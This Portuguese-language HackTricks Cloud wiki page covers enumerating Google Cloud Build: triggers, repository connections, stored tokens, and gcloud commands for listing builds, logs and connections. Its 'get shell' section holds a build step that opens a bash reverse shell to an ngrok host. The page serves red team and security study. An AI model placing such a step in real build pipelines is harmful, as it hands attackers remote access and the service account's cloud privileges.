# GCP - Cloud Build Enum

{% hint style="success" %}
Aprenda e pratique AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo no Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo no telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Informa√ß√µes B√°sicas

Google Cloud Build √© uma plataforma CI/CD gerenciada que **automatiza processos de build** e lan√ßamento de software, integrando-se com **reposit√≥rios de c√≥digo-fonte** e suportando uma ampla gama de linguagens de programa√ß√£o. Ele **permite que os desenvolvedores construam, testem e implantem c√≥digo automaticamente** enquanto oferece flexibilidade para personalizar etapas e fluxos de trabalho de build.

Cada Cloud Build Trigger est√° **relacionado a um Cloud Repository ou diretamente conectado a um reposit√≥rio externo** (Github, Bitbucket e Gitlab).

{% hint style="success" %}
N√£o consegui ver nenhuma maneira de roubar o token do Github/Bitbucket daqui ou dos Cloud Repositories porque quando o reposit√≥rio √© baixado, ele √© acessado via uma URL [https://source.cloud.google.com/](https://source.cloud.google.com/) e o Github n√£o √© acessado pelo cliente.
{% endhint %}

### Eventos

O Cloud Build pode ser acionado se:

* **Push para um branch**: Especificar o branch
* **Push de uma nova tag**: Especificar a tag
* **Pull request**: Especificar o branch que recebe o PR
* **Invoca√ß√£o Manual**
* **Mensagem Pub/Sub:** Especificar o t√≥pico
* **Evento de Webhook**: Expor√° uma URL HTTPS e a solicita√ß√£o deve ser autenticada com um segredo

### Execu√ß√£o

Existem 3 op√ß√µes:

* Um yaml/json **especificando os comandos** a serem executados. Normalmente: `/cloudbuild.yaml`
* Apenas um que pode ser especificado "inline" no console web e no cli
* Op√ß√£o mais comum
* Relevante para acesso n√£o autenticado
* Um **Dockerfile** para build
* Um **Buildpack** para build

### Permiss√µes SA

A **Service Account tem o escopo `cloud-platform`**, ent√£o ela pode **usar todos os privil√©gios.** Se **nenhuma SA for especificada** (como ao fazer submit) a **SA padr√£o** `<proj-number>@cloudbuild.gserviceaccount.com` ser√° **usada.**

Por padr√£o, nenhuma permiss√£o √© dada, mas √© bastante f√°cil conceder algumas:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Aprova√ß√µes

√â poss√≠vel configurar um Cloud Build para **requerer aprova√ß√µes para execu√ß√µes de build** (desativado por padr√£o).

### Aprova√ß√µes de PR

Quando o trigger √© PR, porque **qualquer pessoa pode realizar PRs para reposit√≥rios p√∫blicos**, seria muito perigoso simplesmente **permitir a execu√ß√£o do trigger com qualquer PR**. Portanto, por padr√£o, a execu√ß√£o ser√° **autom√°tica apenas para propriet√°rios e colaboradores**, e para executar o trigger com PRs de outros usu√°rios, um propriet√°rio ou colaborador deve comentar `/gcbrun`.

<figure><img src="../../../.gitbook/assets/image (150).png" alt="" width="563"><figcaption></figcaption></figure>

### Conex√µes & Reposit√≥rios

Conex√µes podem ser criadas sobre:

* **GitHub:** Ser√° exibido um prompt OAuth solicitando permiss√µes para **obter um token do Github** que ser√° armazenado dentro do **Secret Manager.**
* **GitHub Enterprise:** Ser√° solicitado instalar um **GithubApp**. Um **token de autentica√ß√£o** do seu host GitHub Enterprise ser√° criado e armazenado neste projeto como um segredo do **Secret Manager**.
* **GitLab / Enterprise:** Voc√™ precisa **fornecer o token de acesso √† API e o token de acesso de leitura √† API** que ser√£o armazenados no **Secret Manager.**

Uma vez que uma conex√£o √© gerada, voc√™ pode us√°-la para **vincular reposit√≥rios aos quais a conta do Github tem acesso**.

Esta op√ß√£o est√° dispon√≠vel atrav√©s do bot√£o:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Note que reposit√≥rios conectados com este m√©todo est√£o **dispon√≠veis apenas em Triggers usando a 2¬™ gera√ß√£o.**
{% endhint %}

### Conectar um Reposit√≥rio

Isso n√£o √© o mesmo que uma **`conex√£o`**. Isso permite **diferentes** maneiras de obter **acesso a um reposit√≥rio do Github ou Bitbucket**, mas **n√£o gera um objeto de conex√£o, mas gera um objeto de reposit√≥rio (de 1¬™ gera√ß√£o).**

Esta op√ß√£o est√° dispon√≠vel atrav√©s do bot√£o:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Armazenamento

√Äs vezes, o Cloud Build **gerar√° um novo armazenamento para armazenar os arquivos para o trigger**. Isso acontece, por exemplo, no exemplo que o GCP oferece com:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Um bucket de Storage chamado [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) √© criado para armazenar um `.tgz` com os arquivos a serem usados.

### Obter shell
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
Instalar gcloud dentro do cloud build:
```bash
# https://stackoverflow.com/questions/28372328/how-to-install-the-google-cloud-sdk-in-a-docker-image
curl https://dl.google.com/dl/cloudsdk/release/google-cloud-sdk.tar.gz > /tmp/google-cloud-sdk.tar.gz
mkdir -p /usr/local/gcloud
tar -C /usr/local/gcloud -xvf /tmp/google-cloud-sdk.tar.gz
/usr/local/gcloud/google-cloud-sdk/install.sh
```
### Enumera√ß√£o

Voc√™ pode encontrar **informa√ß√µes sens√≠veis em configura√ß√µes e logs de build**.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### Escala√ß√£o de Privil√©gios

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Acesso N√£o Autenticado

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### P√≥s-Explora√ß√£o

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

{% hint style="success" %}
Aprenda e pratique AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo no Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo no telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
